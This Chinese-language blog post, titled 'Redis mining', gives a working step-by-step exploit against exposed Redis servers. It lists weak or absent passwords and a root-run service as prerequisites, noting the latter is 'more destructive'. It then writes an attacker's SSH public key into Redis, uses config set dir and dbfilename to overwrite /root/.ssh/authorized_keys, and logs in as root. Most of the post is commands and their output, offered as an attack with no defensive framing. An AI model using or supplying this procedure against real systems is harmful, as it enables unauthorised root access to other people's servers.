---
title: "Redis挖矿"
description: "Redis挖矿"
keywords: "Redis"

date: 2023-06-16T16:41:30+08:00
lastmod: 2023-06-16T16:41:30+08:00

categories:
  - Redis
tags:
  - Redis
---

## 1. 首先我们需要一些先决条件
- 条件一：你首先要有一个Redis，并且我们要知道他的端口【默认6379】；
- 条件二：Redis的密码不能过于复杂，或者没有密码；
- 条件三：启动Redis的用户最好是Root用户，这样破坏性更大；
## 2. 创建密钥对
```bash
[root@fedora ~]# ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Created directory '/root/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:W97/OpnQued99LuJ2+4R4yrVAoPqxJ+PcYj5ZBvEjAE root@fedora
The key's randomart image is:
+---[RSA 3072]----+
|     E           |
|      .          |
|       .  .      |
|        =. o     |
|      ..S+. o..+ |
|       +++...o+.+|
|      ooo*o.o..B.|
|       .+o*. .O B|
|         +...+*&B|
+----[SHA256]-----+
```
## 3. 通过公钥生成攻击键值
```bash
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n";) > foo.txt
```
## 4. **配置Key到Redis中**
```bash
cat foo.txt |redis-cli -h 192.168.243.129 -x set bar
```
登录Redis进行检查，是否已经写入进Redis中。
```bash
# redis-cli -h 192.168.211.92
192.168.211.92:6379> get bar
"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDT7pRswOtbeoORgawZVEXI/PNHcLixhR0vo0+RavW8uZawKdaVGpBib84jhXy7IWz/vCDrCdZvDe46YlLGJq3ItNEV4ZwI6gjGQZCIFU5Bj0EVG33L5rhVx/Eqx1aXkdJJPBykUNTqLMqycD9Vwu83X1fo1pKLfrKCgJCJCtTj1vgIylYtFP9sDBaXG7y88HP3DuoXW84EJgEQpIAhHn0h79X5EC4i4ow7FvYHmEhDqc1ba/9CBIkHXQDnRWh2gftMhK0OkXc9+XJbj6SKZ/bg7Klwj6BVstd2xsKxcYNLNB9P3JGDjO57fAF/7JCqpt40hoRkBOnNji3f5zRuX4edFTBs9R7ifra+QdO/EJuxXL5h+laUzZbi+zBcnV9Ie+EU7q6Rp3+wo4RERh7rQJOHPn7Q+yJkj1dsSiYzkcGR3LJOjX7sKQS20R9p0YYSvn1Gi8DLEHuuyqFkjmWCqNxxzcXefDA509NxqewAe6s1UQMX9JWA/yb4O6mBKoFJfUs= root@fedora\n\n\n\n"
192.168.211.92:6379> 
```
## 5. **通过Redis保存机制替换系统文件**
```bash
192.168.211.92:6379> config set dir /root/.ssh
OK
192.168.211.92:6379> config get dir
1) "dir"
2) "/root/.ssh"
192.168.211.92:6379> config set dbfilename "authorized_keys"
OK
192.168.211.92:6379> save
OK
192.168.211.92:6379> exit
```
## 6. 登录远程主机
```bash
[root@fedora ~]# ssh root@192.168.211.92
Linux 102-debian 5.15.30-2-pve #1 SMP PVE 5.15.30-3 (Fri, 22 Apr 2022 18:08:27 +0200) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 16 07:45:36 2022 from 192.168.211.123
root@102-debian:~# 
```
